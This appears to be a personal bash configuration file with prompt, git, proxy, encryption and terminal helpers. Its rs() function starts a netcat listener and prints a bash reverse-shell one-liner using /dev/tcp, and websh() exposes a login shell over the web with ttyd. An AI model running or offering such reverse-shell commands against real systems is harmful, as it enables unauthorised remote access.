#!/usr/bin/env bash
#
# ~/.bashrc
#
# shellcheck disable=SC2155,SC1091,SC2207
# shellcheck source=/home/cnboonhan/.bashrc

set -o vi

export EDITOR=vim
export GPG_TTY=$(tty)
export PS1='\[\e[1m\]\[\e[34m\]\u@\h [$(get_battery)]:\w \[\e[91m\]$(parse-git-branch) \[\e[0m\]$ '
export GIT_DISCOVERY_ACROSS_FILESYSTEM=1

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

alias ls='ls --color=auto'

{ [ -f /usr/share/bash-completion/bash_completion ] && . "/usr/share/bash-completion/bash_completion"; } ||
    echo "No bash completion available"

get_battery() {
    /usr/bin/cat "$(find /sys/class/power_supply/ 2>/dev/null | grep BAT | head -1)/capacity" 2>/dev/null || echo 100
}

parse-git-branch() {
    git branch 2>/dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/(\1)/'
}


git-pull-all() {
    find . -type d -name .git -exec sh -c 'i="$1"; cd $i/../ && pwd && git stash > /dev/null && git pull' _ {} \;
}

git-fetch-all() {
    git branch -r | grep -v '\->' | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" | while read -r remote; do git branch --track "${remote#origin/}" "$remote"; done
    git fetch --all
    git pull --all
}

ch(){
  HOME=$PWD
}

hc(){
  HOME=/home/$USER
}

proxy-socks(){
  ADDR="${1:-127.0.0.1}"
  PORT="${2:-1080}"
  PROXY_IGNORE="${3:-192.168.49.0/24}"
  export HTTP_PROXY="socks5h://$ADDR:$PORT"
  export HTTPS_PROXY="socks5h://$ADDR:$PORT"
  export http_proxy="socks5h://$ADDR:$PORT"
  export https_proxy="socks5h://$ADDR:$PORT"
  gsettings set org.gnome.system.proxy mode manual
  gsettings set org.gnome.system.proxy.socks port "$PORT"
  gsettings set org.gnome.system.proxy.socks host "$ADDR"
  gsettings set org.gnome.system.proxy ignore-hosts "['localhost', '127.0.0.0/8', '::1', \"$PROXY_IGNORE\"]"
  cat <<EOF | sudo tee /etc/apt/apt.conf.d/proxy.conf > /dev/null
Acquire {
  HTTP::proxy "socks5h://$ADDR:$PORT";
  HTTPS::proxy "socks5h://$ADDR:$PORT";
}
EOF
}

proxy-http(){
  ADDR="${1:-192.168.49.1}"
  PORT="${2:-8282}"
  PROXY_IGNORE="${3:-192.168.49.0/24}"
  export HTTP_PROXY="$ADDR:$PORT"
  export HTTPS_PROXY="$ADDR:$PORT"
  export http_proxy="$ADDR:$PORT"
  export https_proxy="$ADDR:$PORT"
  gsettings set org.gnome.system.proxy mode manual
  gsettings set org.gnome.system.proxy.http port "$PORT"
  gsettings set org.gnome.system.proxy.http host "$ADDR"
  gsettings set org.gnome.system.proxy.https port "$PORT"
  gsettings set org.gnome.system.proxy.https host "$ADDR"
  gsettings set org.gnome.system.proxy ignore-hosts "['localhost', '127.0.0.0/8', '::1', \"$PROXY_IGNORE\"]"
  cat <<EOF | sudo tee /etc/apt/apt.conf.d/proxy.conf > /dev/null
Acquire {
  HTTP::proxy "http://$ADDR:$PORT";
  HTTPS::proxy "http://$ADDR:$PORT";
}
EOF
}

no-proxy(){
  unset HTTP_PROXY
  unset HTTPS_PROXY
  unset http_proxy
  unset https_proxy
  sudo rm /etc/apt/apt.conf.d/proxy.conf  2> /dev/null
  gsettings set org.gnome.system.proxy mode none
}

rs(){
  PORT=${1:-1337}
  IPS=($(ip -o addr | awk '!/^[0-9]*: ?lo|link\/ether/ {gsub("/", " "); print $2" "$4}' | awk '{ print $2 }'))
  echo "Select Reverse Shell Bind IP"
  select IP in "${IPS[@]}";
  do
    echo "You selected $IP"
    echo "Run the following command: bash -i >& /dev/tcp/$IP/$PORT 0>&1"
    break
  done
  nc -nvlk "$PORT"
}

websh(){
  PORT=${1:-18000}
  sudo ttyd -p "$PORT" login 
}

[ -d "$HOME/.nvm" ] && 
    export NVM_DIR="$([ -z "${XDG_CONFIG_HOME-}" ] && printf %s "${HOME}/.nvm" || printf %s "${XDG_CONFIG_HOME}/nvm")" &&
    [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"

decrypt() {
    mkdir -p "$HOME/.decrypt"
    gocryptfs "$HOME/.encrypt" "$HOME/.decrypt"
}

encrypt() {
    fusermount -u "$HOME/.decrypt"
}

m() {
    source "$HOME/.conf/.venv/bin/activate"
    cd "$HOME/.conf" && python -m main
    deactivate
}
